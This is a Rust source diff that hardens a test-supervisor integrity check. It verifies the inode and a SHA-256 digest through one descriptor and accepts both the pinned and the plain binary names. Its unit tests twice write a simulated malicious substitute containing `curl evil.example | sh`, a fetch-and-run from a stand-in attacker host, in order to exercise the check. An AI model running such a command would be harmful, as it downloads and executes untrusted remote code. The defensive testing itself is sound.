@@ -571,20 +571,34 @@ fn duplicate_validated_proof(fd: std::os::fd::RawFd) -> anyhow::Result<std::fs::
     Ok(proof)
 }
 
-/// Confirm the supervisor executable is still the program that minted the proof.
+/// Confirm the supervisor executable is still the image that minted the proof.
 ///
-/// The inode pair is the fast path and the strong one: same device, same inode,
-/// same file. But it cannot stand alone, because a legitimate rebuild allocates
-/// a new inode — Cargo replaces a binary by writing a new file and renaming it
-/// into place, and `finch-test-supervisor` is a workspace target that the
-/// supervised `cargo test` can relink underneath the running supervisor. That
-/// produced `supervisor executable identity changed` on untouched `main`,
-/// indistinguishable from a genuine substitution, which is exactly what made a
-/// real breach dismissible as a known nuisance (#259).
+/// Both the inode pair and the content digest, always, from one descriptor.
 ///
-/// So a mismatched inode falls back to what the image *contains*. Same bytes is
-/// the same program however it got there; different bytes is a substitution and
-/// is named as one.
+/// The inode pair alone was too weak in one direction and too brittle in the
+/// other. Too weak: an in-place overwrite keeps the inode, so a different
+/// program at the same inode passed. Too brittle: `finch-test-supervisor` is a
+/// Cargo target, and Cargo replaces a binary by writing a new file and renaming
+/// it into place, which allocates a new inode — so a relink underneath the
+/// running supervisor produced `supervisor executable identity changed`,
+/// indistinguishable from an attack (#259).
+///
+/// Do not turn the digest into a fallback consulted only when the inode
+/// differs. That is what an earlier version of this function did, and it made
+/// the check strictly weaker than the one it replaced: the same-inode branch
+/// returned before the digest was ever computed, so the overwrite case stayed
+/// accepted. Both are checked, and one open serves both — two path lookups gave
+/// an attacker with write access to the target directory a window to have the
+/// `stat` see one file and the read see another.
+///
+/// A relink of a byte-identical image is accepted, because it is the same
+/// program. A relink that changes the bytes is not, and cannot be: at that
+/// point a rebuild and a substitution are genuinely indistinguishable from
+/// here, so the diagnostic states what was observed and names both causes
+/// rather than asserting one. Measured, not assumed: `cargo test` unifies
+/// features with dev-dependencies, so its uplifted binary differs from
+/// `cargo build --bin`'s for this very target. The pinned copy is what makes
+/// the relink case not arise in the first place.
 #[cfg(unix)]
 fn verify_supervisor_image(
     recorded_identity: &str,
@@ -593,37 +607,72 @@ fn verify_supervisor_image(
 ) -> anyhow::Result<()> {
     use anyhow::Context as _;
     use sha2::{Digest as _, Sha256};
-    use std::os::unix::fs::MetadataExt as _;
+    use std::io::Read as _;
+    use std::os::unix::fs::{MetadataExt as _, OpenOptionsExt as _};
 
-    let metadata = std::fs::metadata(executable)?;
-    if recorded_identity == format!("{}:{}", metadata.dev(), metadata.ino()) {
+    let mut file = std::fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(nix::libc::O_NOFOLLOW)
+        .open(executable)
+        .with_context(|| {
+            format!(
+                "supervisor executable {} could not be opened to verify its image",
+                executable.display()
+            )
+        })?;
+    // `fstat` and the read both go through this descriptor, so they cannot
+    // observe two different files.
+    let metadata = file.metadata()?;
+    let identity = format!("{}:{}", metadata.dev(), metadata.ino());
+    let mut image = Vec::new();
+    file.read_to_end(&mut image)?;
+    let digest = hex::encode(Sha256::digest(&image));
+
+    if digest == recorded_digest {
+        if identity != recorded_identity {
+            tracing::warn!(
+                executable = %executable.display(),
+                "supervisor executable was relinked between proof mint and \
+                 verification; the image is byte-identical, so the proof holds"
+            );
+        }
         return Ok(());
     }
 
-    let digest = hex::encode(Sha256::digest(std::fs::read(executable).with_context(
-        || {
-            format!(
-                "supervisor executable {} could not be read to check for substitution",
-                executable.display()
-            )
-        },
-    )?));
     anyhow::ensure!(
-        digest == recorded_digest,
-        "supervisor executable was replaced with a different program at {}; \
-         this is a substitution, not a rebuild — the recorded image digest does \
-         not match the file now at that path",
+        identity != recorded_identity,
+        "supervisor executable {} was overwritten in place: same inode, \
+         different image. A rebuild cannot do this — Cargo renames a new file \
+         into place rather than writing through an existing one.",
         executable.display()
     );
-    tracing::warn!(
-        executable = %executable.display(),
-        "supervisor executable was relinked between proof mint and verification; \
-         the image is byte-identical, so the proof still holds"
+    anyhow::bail!(
+        "supervisor executable {} is not the image that minted this proof \
+         (recorded {recorded_identity}, found {identity}; the contents differ \
+         too). Either the program was replaced, or this path is a Cargo target \
+         that was relinked by the command running under it — a relink changes \
+         the bytes, so the two cannot be told apart from here. Run through \
+         scripts/test_brains.sh, which pins a copy Cargo never writes.",
+        executable.display()
     );
-    Ok(())
 }
 
-fn expected_supervisor_executable() -> anyhow::Result<std::path::PathBuf> {
+/// Is this the supervisor binary belonging to the current build directory?
+///
+/// Either name is accepted, not the pinned one in preference.
+///
+/// Preferring the pinned copy meant that the moment it existed, any launcher
+/// that pointed `FINCH_TEST_SUPERVISOR_BIN` at the plain path — `test_server.sh`
+/// and `test_tool_passthrough.sh` both do — recorded that path in its proof and
+/// was then told the issuer was not an ancestor test supervisor. Those
+/// launchers were unaffected by #259 before, because they run the `finch`
+/// binary rather than `cargo test`, so nothing relinked the supervisor
+/// underneath them; creating the pinned copy would have broken them.
+///
+/// `scripts/lib/brain_test_isolation.sh` already accepted all four names
+/// (debug and release, pinned and plain). This mirrors it rather than
+/// inventing a narrower rule on the Rust side.
+fn is_expected_supervisor_executable(candidate: &std::path::Path) -> anyhow::Result<bool> {
     let test_executable = std::env::current_exe()?.canonicalize()?;
     let mut directory = test_executable
         .parent()
@@ -633,21 +682,21 @@ fn expected_supervisor_executable() -> anyhow::Result<std::path::PathBuf> {
             .parent()
             .ok_or_else(|| anyhow::anyhow!("test dependency directory has no parent"))?;
     }
-    let pinned_name = if cfg!(windows) {
-        "finch-test-supervisor-pinned.exe"
+    let names: [&str; 2] = if cfg!(windows) {
+        [
+            "finch-test-supervisor-pinned.exe",
+            "finch-test-supervisor.exe",
+        ]
     } else {
-        "finch-test-supervisor-pinned"
+        ["finch-test-supervisor-pinned", "finch-test-supervisor"]
     };
-    let pinned = directory.join(pinned_name);
-    if pinned.is_file() {
-        return Ok(pinned.canonicalize()?);
+    for name in names {
+        let path = directory.join(name);
+        if path.is_file() && path.canonicalize()? == candidate {
+            return Ok(true);
+        }
     }
-    let name = if cfg!(windows) {
-        "finch-test-supervisor.exe"
-    } else {
-        "finch-test-supervisor"
-    };
-    Ok(directory.join(name).canonicalize()?)
+    Ok(false)
 }
 
 #[cfg(target_os = "linux")]
@@ -823,7 +872,7 @@ fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<
             && expected_supervisor_pid == supervisor_pid
             && process_descends_from(supervisor_pid)?
             && process_executable(supervisor_pid)?.canonicalize()? == supervisor_executable
-            && supervisor_executable == expected_supervisor_executable()?,
+            && is_expected_supervisor_executable(&supervisor_executable)?,
         "proof issuer is not an ancestor test supervisor"
     );
     #[cfg(unix)]
@@ -1140,19 +1189,12 @@ fn isolated_test_peer_process_is_owned(peer_pid: nix::libc::pid_t) -> bool {
 mod isolation_tests {
     use super::*;
 
-    /// #259. The supervisor's own rebuild must not read as an attack, and an
-    /// attack must not read as a rebuild.
-    ///
-    /// `finch-test-supervisor` is a workspace binary target, so the supervised
-    /// `cargo test` can relink it. Cargo replaces a binary by writing a new file
-    /// and renaming it into place, which allocates a new inode — so the recorded
-    /// `(dev, ino)` stopped matching and the check fired against the
-    /// supervisor's own rebuild with `supervisor executable identity changed`.
-    /// That is exactly what a genuine substitution looks like, which made a real
-    /// breach dismissible as the known nuisance.
+    /// #259. The supervisor's own rebuild must not read as an attack, an attack
+    /// must not read as a rebuild, and an in-place overwrite must not slip
+    /// through on a matching inode.
     #[cfg(unix)]
     #[test]
-    fn supervisor_image_check_separates_a_rebuild_from_a_substitution() {
+    fn supervisor_image_check_covers_relink_overwrite_and_substitution() {
         use sha2::{Digest as _, Sha256};
         use std::os::unix::fs::MetadataExt as _;
 
@@ -1165,12 +1207,30 @@ mod isolation_tests {
         let identity = format!("{}:{}", metadata.dev(), metadata.ino());
         let digest = hex::encode(Sha256::digest(image));
 
-        // Unchanged: the fast path.
+        // Untouched.
         verify_supervisor_image(&identity, &digest, &executable)
             .expect("an untouched supervisor must verify");
 
-        // A rebuild: same program, new inode, exactly how Cargo replaces a
-        // binary. Write beside it and rename, so the inode really does change.
+        // Overwritten in place: the inode still matches, so an inode-only check
+        // — and a digest consulted only as a fallback — both accept this.
+        std::fs::write(&executable, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        let same_inode = std::fs::metadata(&executable).unwrap();
+        assert_eq!(
+            format!("{}:{}", same_inode.dev(), same_inode.ino()),
+            identity,
+            "writing through the file must keep the inode, or this case proves \
+             nothing"
+        );
+        let error = verify_supervisor_image(&identity, &digest, &executable)
+            .expect_err("a different image at the same inode must be refused");
+        assert!(
+            error.to_string().contains("overwritten in place"),
+            "got {error}"
+        );
+
+        // Relinked with the same bytes: new inode, same program. This is what a
+        // copy produces, and what the pinned image guarantees.
+        std::fs::remove_file(&executable).unwrap();
         let relinked = temp.path().join("finch-test-supervisor.new");
         std::fs::write(&relinked, image).unwrap();
         std::fs::rename(&relinked, &executable).unwrap();
@@ -1178,20 +1238,57 @@ mod isolation_tests {
         assert_ne!(
             format!("{}:{}", rebuilt.dev(), rebuilt.ino()),
             identity,
-            "the rename must allocate a new inode, or this test proves nothing"
+            "the rename must allocate a new inode, or this case proves nothing"
         );
         verify_supervisor_image(&identity, &digest, &executable)
-            .expect("a relink of the same program must be accepted, not read as an attack");
+            .expect("a relink of the same image must be accepted, not read as an attack");
 
-        // A substitution: a different program at the same path.
-        std::fs::write(&executable, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        // Relinked with different bytes. A real Cargo relink does this — `cargo
+        // test` unifies features with dev-dependencies, so its uplifted binary
+        // differs from `cargo build --bin`'s. It is genuinely indistinguishable
+        // from a substitution, so the diagnostic must state what it observed
+        // and name both causes rather than asserting one.
+        std::fs::remove_file(&executable).unwrap();
+        let replaced = temp.path().join("finch-test-supervisor.other");
+        std::fs::write(&replaced, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        std::fs::rename(&replaced, &executable).unwrap();
         let error = verify_supervisor_image(&identity, &digest, &executable)
-            .expect_err("a different program at that path must be refused");
+            .expect_err("a different image at a new inode must be refused");
         let message = error.to_string();
         assert!(
-            message.contains("substitution") && message.contains("not a rebuild"),
-            "the diagnostic must name substitution, so a real breach is not \
-             dismissed as the rebuild nuisance; got {message:?}"
+            message.contains("not the image that minted this proof")
+                && message.contains("Either the program was replaced")
+                && message.contains("relinked"),
+            "the diagnostic must name both causes rather than asserting one, so \
+             a real breach is not dismissed as rebuild noise and rebuild noise \
+             is not reported as a breach; got {message:?}"
+        );
+    }
+
+    /// Either supervisor name is accepted. Preferring the pinned copy broke
+    /// `test_server.sh` and `test_tool_passthrough.sh`, which point
+    /// `FINCH_TEST_SUPERVISOR_BIN` at the plain path.
+    #[cfg(unix)]
+    #[test]
+    fn both_supervisor_names_are_accepted_in_the_build_directory() {
+        let plain = std::env::current_exe()
+            .unwrap()
+            .canonicalize()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .join("finch-test-supervisor");
+        if !plain.is_file() {
+            // Nothing built the supervisor into this target directory; there is
+            // no candidate to assert on.
+            return;
+        }
+        assert!(
+            is_expected_supervisor_executable(&plain.canonicalize().unwrap()).unwrap(),
+            "the plain supervisor name must stay acceptable once the pinned \
+             copy exists, or every launcher that names it is rejected"
         );
     }
 
